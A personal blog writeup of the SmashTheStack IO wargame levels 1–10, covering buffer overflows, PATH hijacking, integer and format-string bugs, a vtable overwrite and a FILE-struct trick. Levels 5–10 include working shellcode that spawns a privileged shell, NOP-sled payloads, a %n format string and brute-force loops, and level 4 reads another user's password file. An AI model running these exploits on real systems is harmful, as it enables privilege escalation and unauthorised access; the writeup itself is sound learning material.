# SmashTheStack IO Levels 1-10 Writeup

Recently I spent some free time working on the SmashTheStack IO challenges. I felt that my binary reversing and debugging skills weren't that hot, so I wanted something to practice on with a good difficulty curve. The level progression was actually a really addictive incentive to keep on going! You can look at the [IO site itself](http://io.smashthestack.org/) for more information.

I plan to complete more of the IO challenges when I have more time, but wanted to post the first few level notes now before I forgot what they were like. It also helps to get something on my blog to break the ice :)

#### Level 1

The first level was super straightforward. It prompted you to enter the correct number to proceed. Pulling up the binary in ```gdb``` and examining the relevant ```cmp``` instruction revealed the answer.

#### Level 2

The second level actually contained code to pull up a shell in a SIGFPE exception handler. SIGFPE is the exception raised when an arithmetic error occurs, like division-by-zero or floating point overflow/underflow. I'd never seen generated assembly code for a handler like that, so this was new for me. To trigger the code, we'd need to generate a SIGFPE.

The program takes in two arguments, a divisor and a dividend. Off the bat, we notice the code specifically checks to see if our dividend is 0, so we won't be able to trigger a division-by-zero. Since the values were being plugged into atoi, we weren't able to use floating point errors. I was stuck here for a long time simply trying to find other cases that would generate SIGFPE.

After looking around for a while, I discovered the note "(Also dividing the most negative integer by -1 may generate SIGFPE.)" on the [signal manpage notes](http://man7.org/linux/man-pages/man2/signal.2.html#NOTES). This makes sense, since the two's complement system has one more negative number than a positive number, and dividing by -1 flips the sign and makes the number unrepresentable.

#### Level 3

This challenge was the first buffer overflow in the challenges. We need to jump to a given function that doesn't have any code calling it. Luckily, the buffer that our input is read into doesn't have length checks, so we can overwrite the saved EIP/return address on the stack and force a jump to our function.

#### Level 4

At first glance, Level 4 doesn't take appear to take any input from the user. It just calls the ```whoami``` console command and then exit. However, it doesn't use an absolute path in the shell script, so we can abuse the PATH variable to change the call. If we add a directory we control (say ```/tmp/attacker/```) to the beginning of the PATH, it will be checked first and we can run any arbitrary script or executable called "whoami" (my script was just ```cat /home/level5/.pass```)

#### Level 5

Level 5 felt a lot like an updated version of level 3. Again we need to perform a buffer overflow, but this time we don't have existing code in the binary to run our shell, so we need to provide our own shellcode. We also need to make sure that our shellcode calls ```/bin/sh -p``` instead of ```/bin/sh``` so that we preserve the euid of the binary. Otherwise, we will get a shell but it won't run as the level06 user. The final script I used for this is below.

```
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
print ("\x90" * (50 - len(shellcode))) + shellcode + ("\x90" * (90)) + "\xc0\xfb\xff\xbf" + "\x00"
```

Notice that I used an address in the middle of the buffer ("\xc0\xfb\xff\xbf" -> ```0xbffffbc0```), in case the position in memory of the buffer shifted when the code was run outside of GDB. This is a NOP sled, and helps ensure the code more reliably runs.

#### Level 6

This challenge is another buffer overflow, but now with some hoops to jump through. This program is meant to print out a greeting in one of three languages. When looking at the code, we immediately notice some funky stuff with structs and environment variables.

When the program loads it pulls the language from the LANG environment variable, which changes the greeting it prints. It also takes in a username and password, but only seems to use the username. When trying the normal buffer overflow I noticed it only copied 40 bytes for the username and 32 for the password. To overflow the greeting buffer, we'll need 64 bytes. Luckily, since it's a C struct, the username and password fields are stored next to each other in memory (both are multiples of 4 too), so we can use 40 bytes in the username and 32 in the password for a total of 72 bytes. However, after trying this out we notice we still can't overwrite EIP! We need to find more bytes somewhere.

The languages give us the final boost we need. If we choose 'de', we'll actually get enough of an extra boost from the longer German word 'Willkommen' be able to overwrite EIP :) After this, we can execute our shellcode as before.

When executing the shellcode, there's another small bump in the road; since the shellcode I use is 33 bytes, it has to go into the username field (password
can only take 32 max). Thus, my NOP sled is only 40 - 33 = 7 bytes long, making it harder to hit. To get this to work easily, I modified my python script to test
a bunch of different starting positions to find one that would hit my sled.

```
import os
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

for x in xrange(1, 255):
    print x
    command = "./level06 " + ("\x90" * 7) + shellcode + " " + ("\x90" * (25)) + "%s\xfc\xff\xbf" % str(chr(x))
    print command
    os.system(command)
```

#### Level 7

This time we need to perform another buffer overflow, but instead of injecting shellcode the binary has an if statement that pops as hell. A single input string is taken and passed into atoi(). To pop a shell, we need to overwrite a variable in memory (```count```), but since there's a check on the output of atoi (it cannot exceed 10), it seems like we can't actually write the ~60 bytes we need to set the var.

Turns out we can, but in a different way. Take a look at the following line

```
memcpy(buf, argv[2], count * sizeof(int));
```

Notice anything about the memcpy call? It passes the length in as a signed integer * sizeof(int), but memcpy takes an unsigned int! So if we pass in a specific negative value, we can cause the value to be less than 10 for our check, but when multiplied by 4 to overflow into a positive number! In our case, -2147483632 (0x80000010) overflows to 64 (0x40), and this lets us write the value we want to ```count```.

```
print "-2147483632" + " " + ("\x41" * 60) + "\x46\x4c\x4f\x57"
```

#### Level 8

In this level we'll abuse C++'s virtual function pointers with a buffer overflow. It's worth briefly discussing a feature of C++, vtables, that is involved in this challenge. Virtual method tables, or vtables, are used in C++ to call the appropriate child method on an object. For example, if Apple is a child object of Fruit, and both Apple and Fruit define an ```eat()``` method, the runtime will need to call the appropriate method at runtime depending on the code. Another feature of C++ that is (briefly) involved is operating overloading, which lets us assign our own functionality to an operator used in the code (like '+').

When we overflow the buffer in the binary, we can spill into the virtual function pointer table the code uses to determine how to call the '+' operator function. Using this, we can set it to point to our own buffer data and run our shellcode! This level was pretty straightforward once this trick was figured out, so I mostly had to spend my time just thinking/learning about C++ VFTs, since I hadn't really encountered them before.

```
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
print ("\x10\xa0\x04\x08") + ("\x90" * (104 - len(shellcode))) + shellcode + ("\x0c\xa0\x04\x08")
```

#### Level 9

This level was the first one to use a format string vulnerability. Format string vulnerabilities occur when a values are passed to a format function directly (```printf(val)```) instead of (```printf("%s", val)```). This means that if ```val``` contains format specifiers, it can print whatever arbitrary values happen to follow it on the stack when passed to the function. As it turns out, printf also has a format specifier that lets us write a 4-byte integer to memory! It's meant to record the number of bytes written thus far, but it just pulls an address from the stack to write to.

Since we need to write 4 consecutive bytes to memory for this challenge and we don't want to have to write immense numbers of bytes to stdout, we focus on only setting the least significant byte and overwriting it each time we write the next.

The format string vulnerability itself was pretty straightforwrd; simply overwrite the saved EIP value to point to the buffer, then execute standard shellcode. Keep in mind that as you change your input, its length changes, which moves values around in memory. You may have to play around with your values to get the correct location of the return pointer and the buffer to jump to.

I will say one thing I'm not sure of is the purpose of the 'pad' variable, set to ```0xBABE```. Is this just supposed to help you confirm that printf is reading values off the stack or something? Or was I meant to actually use it somehow in the attack?

```
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
first = "\x0c\xfc\xff\xbf"
second = "\x0d\xfc\xff\xbf"
third = "\x0e\xfc\xff\xbf"
fourth = "\x0f\xfc\xff\xbf"
print first + "LOLO" + second + "LOLO" + third + "LOLO" + fourth + "|%08xx|%08x|%15x|%n%184x%n%263x%n%192x%n" + ("\x90" * 100) + shellcode #0xbffff8a0
```

#### Level 10

This level took me a LOOOOONG time, and I ended up having to look at another writeup to get hints to solve :/. The first thing I noticed when looking at the source was the 0-length char array. I'd never seen this construct before, but some googling revealed that it ends up being another pointer to the start of the struct (since no memory is allocated for the array itself). Essentially, the char array gives us a single write-anywhere in memory. However, with the code we are given, we can only write the null (\x00) byte. I spent a lot of time on the following approaches, none of which worked out.

- Overwriting the saved EIP to point to my input buffer
- Looking for something in the struct our array points at to overwrite
- Overwriting the pointer in argv to point to the same location as the input

Eventually, I gave in and looked at another writeup for hints. The person in question had fiddled with the FILE struct to get it to re-read in the password as the error message, and dump it out even on a "failure". This was interesting to me, since I had never worked with FILE structs before. Here are some of the important values we'll need to look at (from: [https://opensource.apple.com/source/gcc/gcc-934.3/libio/libio.h](https://opensource.apple.com/source/gcc/gcc-934.3/libio/libio.h))

```
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  /* more below ... */
};
```

As it turns out, if we overwrite ```_IO_read_ptr```, we can force the FILE struct to begin reading from the beginning of the file again. So, our exploit becomes simple: after the code reads in the password, we reset the read pointer (starting it from offset 0 again) and then it reads in the password again as the error message. We can calculate the base address we want to overwrite in memory with some simple math

```
Base address of our pointer in memory: 0xbffffc84
Address of fp->_IO_read_ptr in memory: 0x804a008 + 4 (offset for _IO_read_ptr) = 0x0804a00c
0xbffffc84 - 0x0804a00c = 0xb7fb5c78
```

After making this value negative and converting to decimal, we get -3086703700. However, this is way larger than a 32 bit int. After overflowing it, we end up with 1208263594, which is the ```_IO_read_ptr```' address. The final complication is simply hitting the correct value in memory, because of small shifts in addresses. To counter this, lets just try a range of values centered around what we think the address should be.

```
import os
around = 1208263594
num = 10000

for x in xrange(around - num, around + num):
    os.system("/levels/level10 %s" % str(x))
```